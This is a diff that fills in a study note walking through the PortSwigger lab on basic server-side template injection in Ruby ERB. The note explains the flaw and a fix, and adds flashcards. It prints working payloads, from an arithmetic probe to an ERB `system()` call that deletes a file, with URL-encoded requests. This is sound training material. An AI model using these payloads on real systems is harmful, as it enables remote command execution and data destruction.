@@ -1,38 +1,61 @@
 ---
 title: Basic server-side template injection
-date: '2025-06-18'
+date: '2026-07-10'
 tags:
   - PortSwigger
   - lab
   - ssti
   - walkthrough
-excerpt: >-
-  PortSwigger Web Security Academy lab — Basic server-side template injection.
-  Walkthrough with solution, key takeaways, and blind replay exercise.
+excerpt: "The message parameter is spliced straight into an ERB template, so a small Ruby expression in the query string runs on the server."
 type: lab
 category: PortSwigger Academy
 platform: PortSwigger
-difficulty: apprentice
+difficulty: practitioner
 ---
 
 # Lab: Basic server-side template injection
 
-## Objective
+The `message` parameter is meant to hold one boring sentence, and it does render as text when you send text. Then you send a little arithmetic and the page answers with a number. That is the whole tell: your input is not being displayed, it is being executed.
 
-*Describe the labs objective here*
+## The setup
 
-## Solution Reconstruction
+The home page has a "view details" link that fires a `GET` request such as `/?message=Unfortunately this product is out of stock`, and the value is echoed onto the page. Send `?message=hi` and you get `hi` back. The reflection is on the page, and the app is written in Ruby.
 
-- [ ] Step 1:
-- [ ] Step 2:
-- [ ] Step 3:
-- [ ] Final payload / exploit:
+## How the vulnerability works
 
-## Key Takeaway
+The app builds an ERB template string with your `message` value concatenated into it, then renders that template. ERB is Ruby's template engine, and anything inside `<%= ... %>` is evaluated as Ruby and printed. Because your text has become template source rather than data, the engine runs it. The developer meant for you to pass a string; you are editing the program.
 
-*Write ONE principle I must remember*
+## Solving it
 
-## Next-Day Blind Replay
+1. Confirm the reflection with `GET /?message=hi`.
+2. Prove it is evaluated, not escaped. Send this as the message value:
 
-- [ ] Solved entirely from memory
-- [ ] Needed to look at: *(write the specific step forgotten)*
+```
+<%= 7*7 %>
+```
+
+URL-encoded, that is `/?message=<%25%3d+7*7+%25>`. The page shows `49` where your message should be.
+3. Ruby's `system()` runs an operating system command. Delete Carlos's file:
+
+```ruby
+<%= system("rm /home/carlos/morale.txt") %>
+```
+
+4. URL-encode it and send `GET /?message=<%25+system("rm+/home/carlos/morale.txt")+%25>`. The file is removed and the lab goes green.
+
+## Why that payload works
+
+ERB compiles the template into Ruby, so `<%= expression %>` executes the expression and writes its return value into the output. `7*7` returns `49`, which is why you saw the number. `system()` hands its string to the shell, so the `rm` runs with the web server's privileges. Nothing depends on finding a hidden object or a gadget; the template itself is the sink, and you supply the code.
+
+## The fix
+
+Never concatenate user input into template source. Pass the message as a variable that the engine substitutes at render time, so the string is treated as data and printed, not parsed. Keep a strict line between templates, which are trusted, and the values they render, which are not, and escape output for the context it lands in.
+
+<FlipCard front={<div>What ERB payload deletes Carlos's file?</div>} back={<div>{'<%= system("rm /home/carlos/morale.txt") %>'}</div>} />
+
+<Cloze title="Payload recall" text="To prove evaluation I send {{<%= 7*7 %>}} and get 49; to run a command I call Ruby's {{system}} method inside the same ERB delimiters." />
+
+<QuizCard title="Reading the result" questions={[
+  { question: "What tells you the input is executed, not escaped?", options: ["It is stored then reloaded", "<%= 7*7 %> renders as 49", "The response sets a cookie", "It is base64-decoded"], correct: 1, explanation: "A rendered 49 means the engine evaluated your expression instead of printing it literally." },
+  { question: "Which Ruby call runs an OS command?", options: ["exec_template", "system", "render", "eval_template"], correct: 1, explanation: "system() passes its string to the shell, which is why rm executes." }
+]} />
